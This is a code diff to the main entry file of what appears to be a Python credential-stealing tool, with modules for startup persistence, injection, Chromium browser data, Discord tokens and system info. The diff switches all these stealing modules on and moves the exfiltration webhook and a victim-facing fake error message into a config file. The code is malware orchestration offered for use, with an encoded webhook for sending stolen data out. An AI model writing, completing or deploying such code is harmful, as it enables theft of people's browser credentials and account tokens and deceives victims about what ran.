@@ -7,36 +7,32 @@ from util.injection import *
 from util.startup import *
 from util.sysinfo import *
 
-__WEBHOOK__ = __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")
-
-__USE_ERROR_MESSAGE__ = False
-__ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")
-
-__EXEC_TIME__ = ExecTime()
+from config import __CONFIG__
 
 def main(webhook: str) -> None:
+    _exec_time = exec_time()
+
     funcs = [
-        # debug,
-        # startup,
-        # injection,
-        # chromium,
-        # disctoken,
-        # sysinfo,
+        debug,
+        startup,
+        injection,
+        chromium,
+        disctoken,
+        sysinfo,
     ]
 
     for func in funcs:
-        if type(func) == type:
-            [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
+        if __CONFIG__[func.__name__]:
+            if type(func) == type:
+                [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
+            else:
+                [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]
 
-        else:
-            [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]
+    _exec_time.stop()
+    _exec_time.send(webhook)
 
-    if __USE_ERROR_MESSAGE__:
-        fake_error(__ERROR_MESSAGE__)
-
-    __EXEC_TIME__.stop()
-    __EXEC_TIME__.send(webhook)
-
+    if __CONFIG__['fakeerror']['use']:
+        fake_error(__CONFIG__['fakeerror']['message'])
 
 if __name__ == "__main__":
-    main(__WEBHOOK__)
+    main(__CONFIG__['webhook'])
